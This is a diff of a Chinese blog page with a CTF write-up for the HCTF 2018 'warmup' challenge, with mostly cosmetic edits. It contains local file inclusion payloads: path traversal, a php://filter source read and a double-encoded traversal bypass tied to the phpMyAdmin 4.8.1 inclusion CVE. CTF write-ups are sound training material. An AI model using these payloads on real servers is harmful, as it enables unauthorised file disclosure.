@@ -378,7 +378,7 @@
                 
               
 
-              <time title="创建时间：2018-11-11 22:16:12 / 修改时间：22:18:24" itemprop="dateCreated datePublished" datetime="2018-11-11T22:16:12+08:00">2018-11-11</time>
+              <time title="创建时间：2018-11-11 22:16:12 / 修改时间：22:55:18" itemprop="dateCreated datePublished" datetime="2018-11-11T22:16:12+08:00">2018-11-11</time>
             
 
             
@@ -410,7 +410,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">536</span>
+                <span title="本文字数">528</span>
               
 
               
@@ -448,11 +448,11 @@
           
             <p>只有做这种签到题才能维持得了生活。<br>进入<a href="http://warmup.2018.hctf.io/" target="_blank" rel="noopener">题目</a>可看到：</p>
 <p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx4euyd67rj311s0vudj1.jpg" alt=""></p>
-<p>点进去hint可看到：</p>
+<p>点进去 <strong>hint</strong> 可看到：</p>
 <p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fx4exuo9t2j30ug082t8w.jpg" alt=""></p>
 <p>这个url有个很明显的文件包含，推测是文件包含漏洞。然后试了一下下面两个常用的payload：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=../../../../../../ffffllllaaaagggg.php</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
-<p>。。。并没有出来什么东西。接着在看首页源代码的时候发现有个==source.php #03a9f4==的注释，我们进去看看：</p>
+<p>。。。并没有出来什么东西。接着在看首页源代码的时候发现有个 <strong>source.php</strong> 的注释，我们进去看看：</p>
 <p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx4f9ee9woj3118116wg4.jpg" alt=""></p>
 <p>又是艰难的代码审计过程。通过google发现这题是一个<a href="https://www.imuo.com/a/9d619fd76c6a0eca0904d02f06753307d46e2b1dbea245e67840082cc4b157ec" target="_blank" rel="noopener">PhpMyadmin4.81文件包含的CVE</a>，关于此漏洞的解析网上有很多，这里搬运一个：<a href="http://www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">《phpmyadmin-4.8.1-复现分析》</a><br>直接贴payload吧：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure>
